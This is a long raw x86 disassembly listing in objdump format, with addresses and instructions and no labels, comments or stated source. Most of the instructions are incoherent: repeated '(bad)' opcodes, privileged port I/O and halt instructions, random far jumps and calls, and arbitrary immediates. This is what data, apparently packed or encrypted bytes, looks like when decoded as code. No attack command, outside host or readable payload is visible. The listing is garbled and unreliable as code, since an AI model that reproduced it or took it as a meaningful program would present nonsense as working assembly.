  410e83:	push   0xd30a0390
  410e88:	lahf   
  410e89:	push   ebp
  410e8a:	jmp    0x410e7e
  410e8c:	mov    esi,0x5f6faf3b
  410e91:	adc    DWORD PTR [eax],edx
  410e93:	mov    cl,ch
  410e95:	lahf   
  410e96:	and    BYTE PTR [esp+ebp*2-0x29ef0285],ah
  410e9d:	jmp    0x410e45
  410e9f:	push   ds
  410ea0:	push   es
  410ea1:	std    
  410ea2:	mov    DWORD PTR ds:0x7399,ebp
  410ea7:	ret    
  410ea8:	or     BYTE PTR [edi-0x19],0x41
  410eac:	sbb    esp,DWORD PTR [ebp-0x6cb54261]
  410eb2:	push   cs
  410eb3:	clc    
  410eb4:	add    eax,0x90c2ce5d
  410eb9:	jo     0x410e89
  410ebb:	out    0xbf,al
  410ebd:	dec    esi
  410ebe:	mov    dh,0x1a
  410ec0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410ec1:	mov    al,ds:0x31c56c65
  410ec6:	(bad)  
  410ec7:	retf   0xcce3
  410eca:	std    
  410ecb:	mov    ebx,0x5705d6b0
  410ed0:	in     eax,dx
  410ed1:	mov    bl,0x5e
  410ed3:	jbe    0x410ef2
  410ed5:	mov    BYTE PTR [esi-0x2d0dd270],dl
  410edb:	xor    BYTE PTR [esi+0x23],0x21
  410edf:	cmp    BYTE PTR [ecx+0x6c],ah
  410ee2:	sub    BYTE PTR [edx],ch
  410ee4:	jno    0x410ed9
  410ee6:	xchg   edx,eax
  410ee7:	jg     0x410eac
  410ee9:	mov    esp,0xe7e7b101
  410eee:	stos   BYTE PTR es:[edi],al
  410eef:	call   0xf297:0x50f05627
  410ef6:	out    0x6,eax
  410ef8:	bnd ja 0x410ec6
  410efb:	push   edi
  410efc:	neg    BYTE PTR [edx-0x73]
  410eff:	ss pop ds
  410f01:	cli    
  410f02:	out    dx,al
  410f03:	dec    edi
  410f04:	adc    BYTE PTR [esi],ch
  410f06:	fcomip st,st(7)
  410f08:	jl     0x410ecf
  410f0a:	(bad)  
  410f0c:	jle    0x410efd
  410f0e:	sbb    ebx,DWORD PTR [ebp+0x3b]
  410f11:	mov    ebp,0xa1764571
  410f16:	(bad)  
  410f17:	push   ds
  410f18:	(bad)  
  410f1a:	mov    ds:0x1e9d7c8f,al
  410f1f:	fcmovbe st,st(0)
  410f21:	mov    ebp,DWORD PTR [esp+ecx*8+0x1d]
  410f25:	xor    al,0x9f
  410f27:	sub    BYTE PTR [eax+0x2e],dh
  410f2a:	(bad)  
  410f2b:	arpl   WORD PTR [edi+0x6e],di
  410f2e:	lods   eax,DWORD PTR ds:[esi]
  410f2f:	imul   eax,DWORD PTR [edi+0x1d],0xffffff81
  410f33:	retf   0xdf80
  410f36:	sub    DWORD PTR [ecx],eax
  410f38:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410f39:	jmp    0x8c6c43ff
  410f3e:	jb     0x410f03
  410f40:	push   ecx
  410f41:	dec    ebp
  410f42:	mov    WORD PTR [eax+edi*1],?
  410f45:	xchg   esp,ecx
  410f47:	cs adc ecx,ebx
  410f4a:	add    al,0x85
  410f4c:	arpl   WORD PTR [esi-0x12],sp
  410f4f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410f50:	rol    dh,1
  410f52:	loopne 0x410f7e
  410f54:	and    edi,edx
  410f56:	js     0x410f3e
  410f58:	popa   
  410f59:	sub    eax,0xec22314
  410f5e:	ins    DWORD PTR es:[edi],dx
  410f5f:	rcl    DWORD PTR [edx+ebp*2-0x1cf65a2f],1
  410f66:	aad    0x91
  410f68:	int    0x3
  410f6a:	loopne 0x410fb6
  410f6c:	jle    0x410fe5
  410f6e:	fsub   st(3),st
  410f70:	add    BYTE PTR [ebx-0x66390b22],cl
  410f76:	(bad)  
  410f77:	xchg   edi,eax
  410f78:	outs   dx,DWORD PTR ds:[esi]
  410f79:	inc    edx
  410f7a:	xor    al,0x7c
  410f7c:	nop
  410f7d:	jns    0x410f18
  410f7f:	sub    esp,ecx
  410f81:	dec    edx
  410f82:	nop
  410f83:	cmp    dh,BYTE PTR [ebx+0x60]
  410f86:	ss add esi,ebx
  410f89:	(bad)  
  410f8a:	mov    ds:0xd99247f5,eax
  410f8f:	jne    0x410f84
  410f91:	mov    al,ds:0xda9d1160
  410f96:	add    BYTE PTR [esi],al
  410f98:	shl    ebp,cl
  410f9a:	jl     0x410ff7
  410f9c:	fstp   QWORD PTR [ebx+0x64]
  410f9f:	hlt    
  410fa0:	cdq    
  410fa1:	in     al,dx
  410fa2:	or     al,0x22
  410fa4:	pushf  
  410fa5:	retf   
  410fa6:	or     DWORD PTR [ebp+0x40],eax
  410fa9:	push   ecx
  410faa:	add    esi,eax
  410fac:	sar    BYTE PTR [ebp-0x5e57dde1],cl
  410fb2:	mov    ch,0xba
  410fb4:	pop    esp
  410fb5:	xor    eax,0x78dd6011
  410fba:	push   esp
  410fbb:	cmp    eax,0x379a94b6
  410fc0:	dec    edi
  410fc1:	xchg   edx,ebx
  410fc3:	scas   al,BYTE PTR es:[edi]
  410fc4:	aas    
  410fc5:	push   eax
  410fc6:	daa    
  410fc7:	dec    ecx
  410fc8:	dec    esp
  410fc9:	xchg   BYTE PTR [ecx+0x4b],bh
  410fcc:	hlt    
  410fcd:	push   ebp
  410fce:	neg    bh
  410fd0:	adc    BYTE PTR [eax],bh
  410fd2:	ds in  eax,dx
  410fd4:	cld    
  410fd5:	add    eax,0x6d2710a0
  410fda:	adc    BYTE PTR [esi+0x50],bl
  410fdd:	xlat   BYTE PTR ds:[ebx]
  410fde:	test   eax,0xd46563fd
  410fe3:	mov    al,ds:0xf1b6798f
  410fe8:	push   es
  410fe9:	retf   
  410fea:	out    dx,eax
  410feb:	outs   dx,BYTE PTR ds:[esi]
  410fec:	jno    0x410ff0
  410fee:	pusha  
  410fef:	pushf  
  410ff0:	xor    bl,dl
  410ff2:	out    dx,eax
  410ff3:	mov    ebp,0x82fd7d4f
  410ff8:	sub    DWORD PTR [ecx+0x4ee54ef6],ebx
  410ffe:	push   esp
  410fff:	and    eax,0x6ddedab
  411004:	nop
  411005:	dec    ebp
  411006:	xchg   ebp,eax
  411007:	mov    ds:0xbdd9cf72,eax
  41100c:	xchg   ebp,eax
  41100d:	xor    eax,0x346756b4
  411012:	or     ecx,esp
  411014:	push   es
  411015:	mov    dl,0x72
  411017:	cld    
  411018:	ret    
  411019:	(bad)  
  41101a:	adc    eax,0x8ab49adb
  41101f:	add    al,0xbb
  411021:	mov    eax,0x6bb377b4
  411026:	shl    BYTE PTR [esi-0x47af8e8e],1
  41102c:	xor    al,0xf0
  41102e:	fcmovu st,st(7)
  411030:	mov    BYTE PTR [eax+ebp*4],bh
  411033:	xchg   edi,eax
  411034:	pop    edx
  411035:	dec    esp
  411036:	lea    edx,[edi+0xb4d356a]
  41103c:	or     BYTE PTR [esi-0x6c6e2a19],cl
  411042:	push   edi
  411043:	imul   edx,DWORD PTR [ecx+0x2],0xfba07f76
  41104a:	les    ebx,FWORD PTR [esi+0x4a]
  41104d:	pushf  
  41104e:	test   DWORD PTR [eax],0x2b3cf498
  411054:	cs jno 0x411007
  411057:	test   BYTE PTR [eax],dh
  411059:	fimul  WORD PTR [edx-0x53]
  41105c:	or     DWORD PTR [ecx+esi*8+0x1f5224ad],esi
  411063:	pop    edx
  411064:	test   al,0x3
  411066:	xchg   edi,eax
  411067:	shr    BYTE PTR [edx+0x16],0xe6
  41106b:	jne    0x4110ab
  41106d:	push   esp
  41106e:	adc    eax,0x809426c2
  411073:	iret   
  411074:	sub    eax,0xec1cad47
  411079:	jmp    0xa03339dd
  41107e:	retf   0x922b
  411081:	cmc    
  411082:	cwde   
  411083:	fadd   DWORD PTR [eax-0x220ec57b]
  411089:	in     eax,0xa9
  41108b:	jae    0x41101e
  41108d:	pop    esi
  41108e:	out    dx,al
  41108f:	push   ds
  411090:	popa   
  411091:	push   edi
  411092:	push   0x6c5afa54
  411097:	dec    DWORD PTR [ecx]
  411099:	adc    ebp,DWORD PTR [eax-0xc]
  41109c:	xor    BYTE PTR [ecx],bl
  41109e:	jae    0x411039
  4110a0:	loopne 0x411071
  4110a2:	arpl   di,bx
  4110a4:	lock pop edx
  4110a6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4110a7:	cmp    eax,0xf04895a5
  4110ac:	inc    ecx
  4110ad:	mov    ch,BYTE PTR [edi+edi*2+0x61e14ddf]
  4110b4:	add    edi,DWORD PTR [esi-0xa]
  4110b7:	aas    
  4110b8:	mov    cl,0x91
  4110ba:	sti    
  4110bb:	xchg   esp,eax
  4110bc:	mov    esp,0x6db3e665
  4110c1:	shr    BYTE PTR [edx],0xf2
  4110c4:	imul   eax,DWORD PTR [ecx+0x5c17fd02],0x49
  4110cb:	inc    esi
  4110cc:	imul   ebx,DWORD PTR [ecx-0x5b8d2e74],0xfffffffe
  4110d3:	sbb    al,0xd7
  4110d5:	xor    al,BYTE PTR [eax-0x3e]
  4110d8:	or     al,0xa0
  4110da:	stos   DWORD PTR es:[edi],eax
  4110db:	jmp    0x3f9f:0x9251a416
  4110e2:	fild   WORD PTR [edx-0x34]
  4110e5:	cli    
  4110e6:	jge    0x4110b4
  4110e8:	or     BYTE PTR [ebp-0x5da65bda],dl
  4110ee:	bound  edx,QWORD PTR [ecx-0x69683c8f]
  4110f4:	pop    esi
  4110f5:	sbb    BYTE PTR [ecx],0x44
  4110f8:	shl    ebx,cl
  4110fa:	in     eax,0x16
  4110fc:	add    ah,bl
  4110fe:	dec    edi
  4110ff:	mov    ebx,DWORD PTR [eax]
  411101:	dec    esi
  411102:	test   al,0xf
  411104:	sbb    al,0x1f
  411106:	sar    ebx,1
  411108:	mov    esi,0x18896b50
  41110d:	idiv   DWORD PTR [edx]
  41110f:	(bad)  
  411110:	enter  0x69cf,0xc5
  411114:	xor    al,BYTE PTR [esi-0x75]
  411117:	cs inc ebp
  41111a:	cmp    bl,BYTE PTR [edi+0x61697f0d]
  411120:	test   eax,0x3c42326e
  411125:	pop    es
  411126:	xchg   esp,eax
  411127:	iret   
  411128:	xchg   ch,bh
  41112a:	dec    DWORD PTR [eax-0xb856ab9]
  411130:	inc    edi
  411131:	or     al,0xe5
  411133:	das    
  411134:	inc    ebp
  411135:	addr16 jo 0x4110bd
  411138:	(bad)  
  411139:	jb     0x411198
  41113b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41113c:	lahf   
  41113d:	mov    bh,0x97
  41113f:	or     ebp,DWORD PTR [ecx]
  411141:	sub    DWORD PTR [ebp+0x38],ebx
  411144:	xor    al,0x56
  411146:	adc    eax,0xfff539e6
  41114b:	mov    ss,WORD PTR [eax]
  41114d:	add    ebp,DWORD PTR [eax-0x21]
  411150:	fstp   QWORD PTR [ebx]
  411152:	out    dx,al
  411153:	std    
  411154:	inc    edx
  411155:	xor    eax,0xb9bbb6c8
  41115a:	push   ebp
  41115b:	stos   BYTE PTR es:[edi],al
  41115c:	and    edx,DWORD PTR [bx+si]
  41115f:	jne    0x4111a7
  411161:	aaa    
  411162:	dec    esi
  411163:	mov    BYTE PTR [ebx-0x31e2b785],ch
  411169:	imul   ebx,eax,0xffffffc7
  41116c:	sub    ecx,DWORD PTR [edi-0x551e24a6]
  411172:	jp     0x411197
  411174:	(bad)  
  411175:	into   
  411176:	jne    0x411195
  411178:	pop    ds
  411179:	and    ah,al
  41117b:	imul   ebx
  41117d:	inc    esp
  41117e:	scas   al,BYTE PTR es:[edi]
  41117f:	fadd   QWORD PTR [esi+0x30]
  411182:	(bad)  
  411183:	adc    DWORD PTR [esi],ecx
  411185:	inc    eax
  411186:	cwde   
  411187:	aaa    
  411188:	adc    al,0x27
  41118a:	inc    edi
  41118b:	sar    BYTE PTR [edi+0x2e],0xdf
  41118f:	jmp    0x41cec948
  411194:	mov    eax,ds:0x279ad702
  411199:	in     eax,0xff
  41119b:	inc    ebp
  41119c:	pop    eax
  41119d:	push   cs
  41119e:	and    eax,0xdc556ddd
  4111a3:	mov    esp,0x3545d976
  4111a8:	jge    0x411146
  4111aa:	or     edi,DWORD PTR [edx-0x2d734dee]
  4111b0:	out    0x6d,al
  4111b2:	push   edi
  4111b3:	clc    
  4111b4:	shl    DWORD PTR [eax+0x2d],cl
  4111b7:	xor    DWORD PTR [esi+0x31fa1187],eax
  4111bd:	push   ecx
  4111be:	lds    esp,FWORD PTR [edx-0x11882c02]
  4111c4:	stc    
  4111c5:	cmp    bl,bl
  4111c7:	js     0x411169
  4111c9:	and    eax,0x11a91b8c
  4111ce:	out    dx,al
  4111cf:	pop    eax
  4111d0:	cli    
  4111d1:	adc    BYTE PTR [edi+eiz*4-0x33],bh
  4111d5:	leave  
  4111d6:	pushf  
  4111d7:	inc    edi
  4111d8:	aas    
  4111d9:	ins    BYTE PTR es:[edi],dx
  4111da:	and    esi,DWORD PTR [esi]
  4111dc:	mov    dh,0xf5
  4111de:	mov    ecx,0x6a36001b
  4111e3:	fdivr  DWORD PTR [eax-0x3b9505af]
  4111e9:	aad    0xde
  4111eb:	shl    DWORD PTR [bx],1
  4111ee:	push   ebx
  4111ef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4111f0:	jg     0x41121a
  4111f2:	arpl   WORD PTR [ebp+0x4e],bp
  4111f5:	sub    ah,BYTE PTR [eax]
  4111f7:	mov    al,ds:0x906b88ab
  4111fc:	leave  
  4111fd:	lahf   
  4111fe:	leave  
  4111ff:	inc    ecx
  411200:	mov    al,0x9
  411202:	es stos BYTE PTR es:[edi],al
  411204:	pop    eax
  411205:	js     0x411270
  411207:	inc    edx
  411208:	jno    0x411238
  41120a:	jmp    ebx
  41120c:	outs   dx,DWORD PTR ds:[esi]
  41120d:	push   ebx
  41120e:	xchg   ecx,eax
  41120f:	xchg   BYTE PTR [eax+0x7c],ah
  411212:	ficomp DWORD PTR [edx+0x39]
  411215:	addr16 inc ebx
  411217:	inc    edx
  411218:	frstor [edi+esi*1]
  41121b:	(bad)  
  41121c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41121d:	in     al,0x30
  41121f:	aam    0x79
  411221:	push   es
  411222:	ss ret 0x54ea
  411226:	inc    esi
  411227:	outs   dx,BYTE PTR ds:[esi]
  411228:	sbb    DWORD PTR [edx+ecx*8],edx
  41122b:	mov    edi,0x52d077a0
  411230:	mov    esi,0xef3e0da9
  411236:	outs   dx,BYTE PTR ds:[esi]
  411237:	out    dx,eax
  411238:	jle    0x411204
  41123a:	aad    0xfb
  41123c:	repnz push cs
  41123e:	call   0x32f6:0x3c5e232b
  411245:	bound  ebx,QWORD PTR [eax]
  411247:	mov    ebp,0x84c90eb2
  41124c:	mov    ebx,DWORD PTR [eax-0x27]
  41124f:	xor    eax,DWORD PTR [ebp-0x38]
  411252:	daa    
  411253:	xchg   ecx,eax
  411254:	cmp    eax,0x4e1625b9
  411259:	sub    eax,0x1813b863
  41125e:	pop    es
  41125f:	push   0xca739321
  411264:	push   ebx
  411265:	out    dx,eax
  411266:	clc    
  411267:	sahf   
  411268:	call   0xf6813f72
  41126d:	add    al,0x2d
  41126f:	loop   0x4111fa
  411271:	xor    esp,DWORD PTR [ebp+0x76]
  411274:	mov    es,esp
  411276:	bnd jo 0x4112cb
  411279:	js     0x41124d
  41127b:	mov    edx,0x2c4a5d5a
  411280:	js     0x411294
  411282:	mov    al,ds:0x64db9e25
  411287:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411288:	jmp    0x411272
  41128a:	ins    DWORD PTR es:[edi],dx
  41128b:	mov    ?,WORD PTR [eax]
  41128d:	sbb    eax,0xf87fe572
  411292:	dec    esp
  411293:	repz clc 
  411295:	add    dl,bh
  411297:	add    eax,0x867ac1d
  41129c:	test   eax,0x4d13dc54
  4112a1:	jmp    FWORD PTR [ecx]
  4112a3:	es mov cl,dh
  4112a6:	xchg   edx,eax
  4112a7:	test   bh,dl
  4112a9:	icebp  
  4112aa:	push   0x17b83165
  4112af:	lea    ecx,[ebx+eax*2+0x28]
  4112b3:	stc    
  4112b4:	dec    esi
  4112b5:	adc    BYTE PTR [ebp+0x599c9f4c],bl
  4112bb:	inc    edi
  4112bc:	lock mov dl,0x8d
  4112bf:	in     eax,0x47
  4112c1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4112c2:	iret   
  4112c3:	nop
  4112c4:	mov    edi,0x88b1494b
  4112c9:	mov    esp,0x82915c6f
  4112ce:	test   eax,0x1a554c21
  4112d3:	(bad)  
  4112d5:	xchg   esi,eax
  4112d6:	(bad)  
  4112d7:	xchg   esp,eax
  4112d8:	pop    ds
  4112d9:	repnz and ch,BYTE PTR ds:0x4ad3b0d4
  4112e0:	(bad)  
  4112e1:	and    esi,DWORD PTR [ebp+0x51c97aed]
  4112e7:	inc    ebp
  4112e8:	inc    edx
  4112e9:	adc    eax,0x3e8b101d
  4112ee:	mov    dl,0x92
  4112f0:	imul   ebp,esi,0xeb29106
  4112f6:	in     al,0x27
  4112f8:	(bad)  
  4112f9:	xor    al,0xfb
  4112fb:	int3   
  4112fc:	leave  
  4112fd:	mov    bh,0xd
  4112ff:	bound  ecx,QWORD PTR [esi]
  411301:	dec    ebp
  411302:	adc    ch,bh
  411304:	push   edi
  411305:	xor    ch,bh
  411307:	mov    eax,ds:0xfd6ba8d5
  41130c:	mov    dh,0x94
  41130e:	cld    
  41130f:	sbb    esp,DWORD PTR [esi]
  411311:	or     eax,0xba26cac7
  411316:	mov    esi,DWORD PTR [edi+edi*1-0x26]
  41131a:	jg     0x41134b
  41131c:	ss jno 0x41138d
  41131f:	sar    ebx,cl
  411321:	ror    BYTE PTR [edx],0x38
  411324:	loop   0x411346
  411326:	fdiv   QWORD PTR [eax+eax*8]
  411329:	jmp    0x49e6:0x45fc467a
  411330:	ins    DWORD PTR es:[edi],dx
  411331:	push   es
  411332:	adc    DWORD PTR [ebp-0x53ae2a84],esp
  411338:	xor    al,0xae
  41133a:	adc    ebx,DWORD PTR [esi+0x53]
  41133d:	xor    eax,0xcd72c0f2
  411342:	xchg   ecx,eax
  411343:	cmp    BYTE PTR [ebx],bl
  411345:	mov    ecx,0x91298af9
  41134a:	inc    ebx
  41134b:	sub    eax,0x6693ee2
  411350:	xchg   ecx,eax
  411351:	cmp    BYTE PTR [eax+0x2b14aaf0],dl
  411357:	xor    DWORD PTR [esi],esi
  411359:	stos   DWORD PTR es:[edi],eax
  41135a:	pop    eax
  41135b:	mov    ds:0x90b9cafb,eax
  411360:	scas   eax,DWORD PTR es:[edi]
  411361:	push   esi
  411362:	(bad)  
  411363:	xchg   ecx,eax
  411364:	dec    ebx
  411365:	out    0xbe,eax
  411367:	dec    ecx
  411368:	outs   dx,DWORD PTR ds:[esi]
  411369:	sbb    eax,0x7b2f95bb
  41136e:	fucom  st(7)
  411370:	dec    esi
  411371:	push   ebx
  411372:	mov    WORD PTR [esi*1-0x368b8d2d],ds
  411379:	mov    BYTE PTR [ebp+0x7463b428],dl
  41137f:	add    bh,BYTE PTR [edx-0x4c38eb83]
  411385:	in     eax,0x60
  411387:	dec    edi
  411388:	dec    ebx
  411389:	out    0xcd,eax
  41138b:	test   BYTE PTR [ebp+0x8],al
  41138e:	shl    dh,0xcc
  411391:	mov    eax,?
  411393:	and    eax,0xcb6de505
  411398:	call   0xe52f:0xcab31166
  41139f:	inc    edx
  4113a0:	add    DWORD PTR [ebp-0x7273b59c],edi
  4113a6:	xchg   DWORD PTR [esi],esp
  4113a8:	in     al,0x57
  4113aa:	mov    dl,0x7d
  4113ac:	cmp    cl,bl
  4113ae:	xchg   esp,eax
  4113af:	jmp    0x4113a3
  4113b1:	dec    edx
  4113b2:	fist   WORD PTR [edx-0x58]
  4113b5:	hlt    
  4113b6:	stos   DWORD PTR es:[edi],eax
  4113b7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4113b8:	das    
  4113b9:	repz aad 0x96
  4113bc:	loopne 0x411395
  4113be:	cmp    ebx,DWORD PTR [esi-0xede7550]
  4113c4:	cmp    eax,DWORD PTR [ecx]
  4113c6:	imul   BYTE PTR [ebx]
  4113c8:	pop    esp
  4113c9:	aad    0x83
  4113cb:	jbe    0x411376
  4113cd:	shl    BYTE PTR [eax+ebp*2-0x2],1
  4113d1:	dec    eax
  4113d2:	mov    bl,al
  4113d4:	dec    eax
  4113d5:	mov    BYTE PTR [edx+0x55cb2e41],ch
  4113db:	mov    DWORD PTR [eax],0x48660167
  4113e1:	cmp    eax,0x66baebe1
  4113e6:	popa   
  4113e7:	fwait
  4113e8:	jae    0x4113b5
  4113ea:	xor    bh,BYTE PTR [edx+0xd3dd1f]
  4113f0:	lods   eax,DWORD PTR ds:[esi]
  4113f1:	shl    BYTE PTR [esi-0x16],0x4c
  4113f5:	leave  
  4113f6:	pushf  
  4113f7:	rol    BYTE PTR [ecx-0x47],cl
  4113fa:	outs   dx,DWORD PTR ds:[esi]
  4113fb:	mov    ds:0x24604c91,al
  411400:	jmp    0xbc94:0xbff26931
  411407:	mov    dl,0x33
  411409:	cmp    DWORD PTR [eax+ebp*8],0xfd12d6d7
  411410:	adc    eax,0xede25c78
  411415:	sub    al,0x0
  411417:	and    eax,0x30828bd2
  41141c:	pop    ebp
  41141d:	pop    ecx
  41141e:	mov    esi,0x1d35d0e8
  411423:	sti    
  411424:	or     ecx,DWORD PTR [edi]
  411426:	sub    esi,DWORD PTR [eax-0x3c]
  411429:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41142a:	pop    ecx
  41142b:	cmc    
  41142c:	(bad)  
  41142d:	out    0x33,al
  41142f:	inc    ebp
  411430:	pop    esp
  411431:	nop
  411432:	cmp    eax,0x710fb2c9
  411437:	xchg   edi,eax
  411438:	lods   al,BYTE PTR ds:[esi]
  411439:	(bad)  
  41143a:	aaa    
  41143b:	out    dx,eax
  41143c:	aad    0x6
  41143e:	add    DWORD PTR [esi+esi*2],edx
  411441:	mov    ds:0xe23fc1be,al
  411446:	cmp    ch,bl
  411448:	add    ebp,DWORD PTR [esi]
  41144a:	cmc    
  41144b:	outs   dx,DWORD PTR ds:[esi]
  41144c:	dec    esp
  41144d:	rcr    DWORD PTR [eax+0x6b],cl
  411450:	popf   
  411451:	sbb    BYTE PTR [ecx-0x269f4292],0x61
  411458:	bound  ecx,QWORD PTR [edi-0x1d7dfc0d]
  41145e:	push   ebp
  41145f:	daa    
  411460:	scas   eax,DWORD PTR es:[edi]
  411461:	sub    edi,edi
  411463:	push   ss
  411464:	aaa    
  411465:	adc    al,0x9
  411467:	inc    esi
  411468:	lods   al,BYTE PTR ds:[esi]
  411469:	mov    ebp,0xde7b19d2
  41146e:	cmp    BYTE PTR ds:0xd32899b8,dh
  411474:	dec    esi
  411475:	jecxz  0x411454
  411477:	or     edx,esi
  411479:	adc    edi,DWORD PTR [ebx]
  41147b:	push   es
  41147c:	cmc    
  41147d:	shl    cl,cl
  41147f:	stc    
  411480:	or     al,0x2a
  411482:	mov    DWORD PTR [edx+0x22],eax
  411485:	out    0x48,al
  411487:	sub    al,0xd3
  411489:	pop    eax
  41148a:	imul   edi,DWORD PTR [ebx],0x77389626
  411490:	push   0xffffffcd
  411492:	add    ebp,ecx
  411494:	stos   BYTE PTR es:[edi],al
  411495:	and    DWORD PTR [ecx],eax
  411497:	inc    ecx
  411498:	leave  
  411499:	add    al,0x0
	...
  411513:	add    BYTE PTR [eiz*8+0x7fff35be],bh
  41151a:	mov    edi,0x96dab9ed
  41151f:	mov    BYTE PTR [esi+edx*8],cl
  411522:	pop    ebp
  411523:	adc    ebx,DWORD PTR [ebp-0x41]
  411526:	add    BYTE PTR [eax],al
  411528:	outs   dx,BYTE PTR ds:[esi]
  411529:	pop    es
  41152a:	add    BYTE PTR [eax],al
  41152c:	sub    esi,esi
  41152e:	test   al,0x48
  411530:	push   es
  411531:	add    eax,0xfca2eb9d
  411536:	and    BYTE PTR [edx+ebx*4],bh
  411539:	xchg   edi,eax
  41153a:	push   esp
  41153b:	stos   DWORD PTR es:[edi],eax
  41153c:	sub    al,0x15
  41153e:	jl     0x41157a
  411540:	xor    eax,0xa3075f96
  411545:	push   cs
  411546:	in     al,dx
  411547:	hlt    
  411548:	cld    
  411549:	inc    ebp
  41154a:	daa    
  41154b:	loopne 0x4115b4
  41154d:	add    DWORD PTR [ecx+0x67],eax
  411550:	push   eax
  411551:	jmp    0x411571
  411553:	ss cs pushf 
  411556:	add    DWORD PTR [eax],0xffffffab
  411559:	mov    cl,0x39
  41155b:	jle    0x4114ff
  41155d:	xor    BYTE PTR [eax+0x153521ba],ah
  411563:	std    
  411564:	adc    al,0xad
  411566:	imul   esp,DWORD PTR [esi],0xffffffcc
  411569:	ficom  DWORD PTR [esi-0x3c0260b2]
  41156f:	(bad)  
  411570:	(bad)  
  411571:	xor    cl,ch
  411573:	outs   dx,DWORD PTR ds:[esi]
  411574:	fld    QWORD PTR [ebp-0x57ee4995]
  41157a:	cld    
  41157b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41157c:	fwait
  41157d:	mov    eax,esp
  41157f:	cmp    bh,ch
  411581:	xchg   esi,eax
  411582:	outs   dx,DWORD PTR ds:[esi]
  411583:	fs nop
  411585:	inc    eax
  411586:	fucomip st,st(0)
  411588:	jno    0x4115f6
  41158a:	int3   
  41158b:	xchg   edi,eax
  41158c:	cs enter 0x2b81,0xf1
  411591:	jae    0x41160f
  411593:	lahf   
  411594:	(bad)  
  411595:	in     al,0x1e
  411597:	xchg   ebx,eax
  411598:	mov    edx,0xe27334b6
  41159d:	test   al,0xe5
  41159f:	lds    ebx,FWORD PTR [edi+0x14]
  4115a2:	xchg   esp,eax
  4115a3:	scas   al,BYTE PTR es:[edi]
  4115a4:	push   0x5f34eb3a
  4115a9:	scas   al,BYTE PTR es:[edi]
  4115aa:	outs   dx,BYTE PTR ds:[esi]
  4115ab:	mov    esp,0x1858d4ee
  4115b0:	(bad)  
  4115b1:	cmp    edx,DWORD PTR [esi]
  4115b3:	icebp  
  4115b4:	or     ch,BYTE PTR [ecx+0x21]
  4115b7:	jae    0x411617
  4115b9:	jmp    0x86bc223
  4115be:	inc    eax
  4115bf:	jge    0x41156b
  4115c1:	mov    bh,0x3f
  4115c3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4115c4:	dec    edx
  4115c5:	sub    DWORD PTR [edi-0x10],ebx
  4115c8:	mov    DWORD PTR [ebp+0x7a],0x91acb43
  4115cf:	dec    edi
  4115d0:	xchg   esp,eax
  4115d1:	std    
  4115d2:	mov    edx,0xf896fe34
  4115d7:	push   edx
  4115d8:	mov    ds:0xe5cb7a2d,al
  4115dd:	jmp    0x89b91be5
  4115e2:	adc    al,0x1
  4115e4:	cdq    
  4115e5:	cwde   
  4115e6:	xor    DWORD PTR [eax],0x1cba4122
  4115ec:	(bad)
  4115ef:	sub    DWORD PTR ds:0xa6aaa1cc,0xffffffe3
  4115f6:	lldt   WORD PTR [ebx]
  4115f9:	and    esp,DWORD PTR [esi+0x48ae5f56]
  4115ff:	mov    esp,0xa0796c9d
  411604:	popa   
  411605:	fist   WORD PTR [ecx+edi*4-0x6a326faa]
  41160c:	mov    eax,0x7c60c17c
  411611:	pop    esi
  411612:	and    ebp,DWORD PTR [edi]
  411614:	ror    DWORD PTR [edi-0x1d964915],cl
  41161a:	mov    esi,fs
  41161c:	sub    BYTE PTR [ebx+ecx*1-0x65],bh
  411620:	sub    BYTE PTR [esi+0x4c197506],bl
  411626:	mov    bl,0x5b
  411628:	dec    edx
  411629:	div    DWORD PTR [esi-0x1280874e]
  41162f:	test   eax,0x7833ac66
  411634:	jge    0x41163d
  411636:	scas   eax,DWORD PTR es:[edi]
  411637:	jle    0x4115c9
  411639:	lock loopne 0x41169b
  41163c:	addr16 je 0x41166d
  41163f:	jecxz  0x4115e8
  411641:	cdq    
  411642:	ret    
  411643:	jnp    0x4116b5
  411645:	shl    esi,1
  411647:	mov    BYTE PTR [esi-0x3bdccb0b],bl
  41164d:	scas   al,BYTE PTR es:[edi]
  41164e:	fist   WORD PTR [esi+ebx*8-0xf2dc242]
  411655:	and    BYTE PTR [eax],0xda
  411658:	mov    ebp,0xdd3eef56
  41165d:	sahf   
  41165e:	imul   esp,DWORD PTR [esi+0x21a0bf4e],0x17
  411665:	es in  eax,0xf2
  411668:	jbe    0x41162d
  41166a:	adc    BYTE PTR [esi-0x6fbf272e],cl
  411670:	and    al,0x52
  411672:	fsub   QWORD PTR [ecx]
  411674:	(bad)  
  411675:	div    BYTE PTR [esi+0x584c805d]
  41167b:	xchg   ebx,eax
  41167c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41167d:	mov    DWORD PTR [esi],0xdacb2b92
  411683:	stos   BYTE PTR es:[edi],al
  411684:	ret    0x234f
  411687:	cld    
  411688:	push   si
  41168a:	and    dh,BYTE PTR [edx+eax*1-0x1bb518c8]
  411691:	mov    eax,ds:0x11878293
  411696:	out    dx,eax
  411697:	cmove  edi,eax
  41169a:	inc    edx
  41169b:	aaa    
  41169c:	xchg   edx,eax
  41169d:	jp     0x41168d
  41169f:	push   ds
  4116a0:	mov    DWORD PTR [edx],ebp
  4116a2:	sub    dl,BYTE PTR [ebx]
  4116a4:	int    0x30
  4116a6:	daa    
  4116a7:	pop    eax
  4116a8:	je     0x411715
  4116aa:	ficom  WORD PTR [edx+edi*1]
  4116ad:	int3   
  4116ae:	jae    0x41164f
  4116b0:	test   al,0x16
  4116b2:	inc    ebx
  4116b3:	xchg   DWORD PTR [edi+ebp*2-0x25a7cd3d],edx
  4116ba:	and    al,0x40
  4116bc:	dec    eax
  4116bd:	stc    
